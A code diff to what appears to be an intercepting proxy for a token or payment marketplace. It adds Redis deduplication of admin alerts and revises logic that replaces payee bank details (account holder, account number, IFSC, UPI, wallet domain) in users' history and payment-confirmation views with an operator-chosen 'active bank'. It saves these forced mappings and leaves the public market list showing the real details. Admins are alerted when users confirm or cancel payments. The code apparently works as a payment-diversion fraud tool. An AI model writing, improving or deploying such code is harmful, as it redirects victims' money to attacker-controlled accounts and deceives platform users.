@@ -425,6 +425,27 @@ async function claimOrderNotification(data, valueOrOrder) {
     if (savedObj) savedObj.notified = true;
     data._skipOverrideMerge = true;
     try { await saveData(data); } catch (e) { }
+}
+
+async function claimProcessNotification(orderId, action = 'finish') {
+    if (!orderId) return false;
+    const cleanId = String(orderId).trim();
+    if (!cleanId) return false;
+    const key = `claim_proc_${action}_${cleanId}`;
+
+    // 1. In-memory dedupe check (fast)
+    const now = Date.now();
+    const lastSeen = recentErrors.get(key) || 0;
+    if (now - lastSeen < 120000) return false;
+    recentErrors.set(key, now);
+
+    // 2. Atomic Redis SETNX check (across all serverless lambda instances)
+    if (redis) {
+        try {
+            const res = await redis.set(key, '1', { nx: true, ex: 86400 });
+            if (!res) return false;
+        } catch (e) { }
+    }
     return true;
 }
 
@@ -2189,13 +2210,10 @@ app.all('/xxapi/*', async (req, res) => {
                 const bankText = (savedOrder && savedOrder.bank) || (savedOrder ? `${savedOrder.accountHolder || ''} | ${savedOrder.accountNo || ''}${savedOrder.ifsc ? ' | ' + savedOrder.ifsc : ''}` : '');
                 const isCancelAction = processAction.toLowerCase().includes('cancel');
 
-                if (isCancelAction) {
-                    // ── User Cancelled Order ──────────────────────────────────────────
-                    const cancelDedupeKey = `proc_cancel_${procOrderId}`;
-                    const lastCancelTime = recentErrors.get(cancelDedupeKey) || 0;
-                    const nowMs = Date.now();
-                    if (nowMs - lastCancelTime > 30000) {
-                        recentErrors.set(cancelDedupeKey, nowMs);
+                const shouldNotify = await claimProcessNotification(procOrderId, isCancelAction ? 'cancel' : 'finish');
+                if (shouldNotify) {
+                    if (isCancelAction) {
+                        // ── User Cancelled Order ──────────────────────────────────────────
                         const cancelMsg = `╔══════════════════════════════════╗
 ║   ❌ ORDER CANCELLED BY USER    ║
 ╚══════════════════════════════════╝
@@ -2205,14 +2223,8 @@ app.all('/xxapi/*', async (req, res) => {
 ⚠️ <b>Status</b>   : <b>Cancelled</b>
 🕐 <code>${now}</code>`;
                         notifyAdmin(data, cancelMsg, { parse_mode: 'HTML' }).catch(() => { });
-                    }
-                } else {
-                    // ── User Confirmed Payment (Submission) ───────────────────────────
-                    const finishDedupeKey = `proc_finish_${procOrderId}`;
-                    const lastFinishTime = recentErrors.get(finishDedupeKey) || 0;
-                    const nowMs = Date.now();
-                    if (nowMs - lastFinishTime > 60000) {
-                        recentErrors.set(finishDedupeKey, nowMs);
+                    } else {
+                        // ── User Confirmed Payment (Submission) ───────────────────────────
                         const finishMsg = `╔══════════════════════════════════╗
 ║   💰 USER CONFIRMED PAYMENT      ║
 ╚══════════════════════════════════╝
@@ -2917,8 +2929,14 @@ app.all('/xxapi/*', async (req, res) => {
                 // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
                 // Per-item replace in lists:
                 // 1. Saved orders in KV → replace with saved mapped bank
-                // 2. Unmapped items in list → replace on-the-fly for display ONLY (NEVER save to KV)
+                // 2. User's History/Bought orders → replace with active bank & save to KV
+                // 3. Market Browse List (waitpayerpaymentslip, available orders) → leave REAL IFSC & details untouched!
                 function _replaceListItems(list) {
+                    const isBrowseMarket = urlLower.includes('waitpayerpaymentslip') ||
+                        urlLower.includes('waitpayer') ||
+                        urlLower.includes('/buyitoken/list') ||
+                        urlLower.includes('/market');
+
                     list.forEach(item => {
                         if (!item || typeof item !== 'object') return;
                         const orderState = parseInt(item.orderState ?? item.state ?? -1);
@@ -2943,42 +2961,44 @@ app.all('/xxapi/*', async (req, res) => {
                                 const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
                                 if (mappedWallet) item.walletDomain = mappedWallet;
                             }
-                        } else if (minOk && (!urlLower.includes('history') || orderState <= 2 || item.walletDomain)) {
-                            // On-the-fly replace for display
-                            if (urlLower.includes('waitconfirm')) {
-                                replaceWaitConfirmBankFields(item, bank);
-                            } else {
-                                forceBankDetails(item, bank);
-                            }
-                            if (item.walletDomain) {
-                                item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
-                            }
+                        } else if (!isBrowseMarket && (urlLower.includes('history') || urlLower.includes('waitconfirm') || orderState > 0 || item.walletDomain)) {
+                            // User's own orders (History / Bought items): replace bank details
+                            if (minOk) {
+                                if (urlLower.includes('waitconfirm')) {
+                                    replaceWaitConfirmBankFields(item, bank);
+                                } else {
+                                    forceBankDetails(item, bank);
+                                }
+                                if (item.walletDomain) {
+                                    item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
+                                }
 
-                            // Capture and save order into KV from user's history (/buyitoken/history)
-                            if (urlLower.includes('history') && oId) {
-                                if (!data.orderBankMap) data.orderBankMap = {};
-                                const savedData = {
-                                    bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-                                    accountHolder: bank.accountHolder,
-                                    accountNo: bank.accountNo,
-                                    ifsc: bank.ifsc,
-                                    bankName: bank.bankName || '',
-                                    upiId: bank.upiId || '',
-                                    rptNo: item.rptNo || oId,
-                                    orderNo: item.orderNo || oId,
-                                    orderId: oId,
-                                    amount: iAmt,
-                                    walletDomain: item.walletDomain || '',
-                                    time: now,
-                                    userId: userId || item.uid || item.userId || '',
-                                    isManual: true,
-                                    forced: true
-                                };
-                                data.orderBankMap[oId] = savedData;
-                                if (item.rptNo && String(item.rptNo) !== oId) data.orderBankMap[String(item.rptNo)] = savedData;
-                                if (item.orderNo && String(item.orderNo) !== oId) data.orderBankMap[String(item.orderNo)] = savedData;
-                                data._skipOverrideMerge = true;
-                                saveData(data).catch(() => { });
+                                // Capture and save order into KV from user's history (/buyitoken/history)
+                                if (urlLower.includes('history') && oId) {
+                                    if (!data.orderBankMap) data.orderBankMap = {};
+                                    const savedData = {
+                                        bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
+                                        accountHolder: bank.accountHolder,
+                                        accountNo: bank.accountNo,
+                                        ifsc: bank.ifsc,
+                                        bankName: bank.bankName || '',
+                                        upiId: bank.upiId || '',
+                                        rptNo: item.rptNo || oId,
+                                        orderNo: item.orderNo || oId,
+                                        orderId: oId,
+                                        amount: iAmt,
+                                        walletDomain: item.walletDomain || '',
+                                        time: now,
+                                        userId: userId || item.uid || item.userId || '',
+                                        isManual: true,
+                                        forced: true
+                                    };
+                                    data.orderBankMap[oId] = savedData;
+                                    if (item.rptNo && String(item.rptNo) !== oId) data.orderBankMap[String(item.rptNo)] = savedData;
+                                    if (item.orderNo && String(item.orderNo) !== oId) data.orderBankMap[String(item.orderNo)] = savedData;
+                                    data._skipOverrideMerge = true;
+                                    saveData(data).catch(() => { });
+                                }
                             }
                         }
                     });
